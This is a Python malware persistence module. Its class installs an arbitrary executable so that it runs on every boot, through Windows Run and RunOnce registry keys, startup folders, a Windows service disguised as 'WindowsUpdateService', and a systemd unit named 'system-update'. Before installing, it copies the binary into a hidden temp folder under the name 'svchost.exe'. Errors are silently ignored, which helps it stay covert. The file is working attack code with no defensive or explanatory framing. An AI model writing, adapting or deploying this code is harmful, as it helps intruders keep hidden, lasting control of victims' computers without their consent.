import os
import sys
import winreg
import shutil
import tempfile
import subprocess
from pathlib import Path

class Persistence:
    def __init__(self):
        self.startup_paths = self._get_startup_paths()
        
    def _get_startup_paths(self):
        """Get system-specific startup paths"""
        paths = []
        if os.name == 'nt':  # Windows
            paths.extend([
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            ])
        else:  # Unix-like
            paths.extend([
                os.path.expanduser('~/.config/autostart'),
                '/etc/xdg/autostart'
            ])
        return paths
        
    def install_registry(self, executable_path):
        """Install persistence via registry (Windows)"""
        if os.name != 'nt':
            return False
            
        try:
            key_paths = [
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            ]
            
            for hkey, key_path in key_paths:
                try:
                    key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                except:
                    continue
                    
            return True
        except:
            return False
            
    def install_startup(self, executable_path):
        """Install persistence via startup folder"""
        try:
            filename = os.path.basename(executable_path)
            for startup_path in self.startup_paths:
                if os.path.exists(startup_path):
                    target_path = os.path.join(startup_path, filename)
                    shutil.copy2(executable_path, target_path)
                    return True
        except:
            pass
        return False
        
    def install_service(self, executable_path):
        """Install as a system service"""
        if os.name == 'nt':  # Windows
            service_name = "WindowsUpdateService"
            try:
                # Create service using sc command
                cmd = f'sc create "{service_name}" binPath= "{executable_path}" start= auto'
                subprocess.run(cmd, shell=True, capture_output=True)
                return True
            except:
                return False
        else:  # Unix-like
            service_name = "system-update"
            service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always

[Install]
WantedBy=multi-user.target
'''
            try:
                service_path = f"/etc/systemd/system/{service_name}.service"
                with open(service_path, 'w') as f:
                    f.write(service_content)
                subprocess.run(['systemctl', 'daemon-reload'])
                subprocess.run(['systemctl', 'enable', service_name])
                return True
            except:
                return False
                
    def install_all(self, executable_path):
        """Try all persistence methods"""
        success = False
        
        # Copy to a permanent location
        try:
            permanent_dir = os.path.join(tempfile.gettempdir(), '.cache')
            os.makedirs(permanent_dir, exist_ok=True)
            permanent_path = os.path.join(permanent_dir, 'svchost.exe')
            shutil.copy2(executable_path, permanent_path)
            executable_path = permanent_path
        except:
            pass
            
        # Try all methods
        if self.install_registry(executable_path):
            success = True
        if self.install_startup(executable_path):
            success = True
        if self.install_service(executable_path):
            success = True
            
        return success
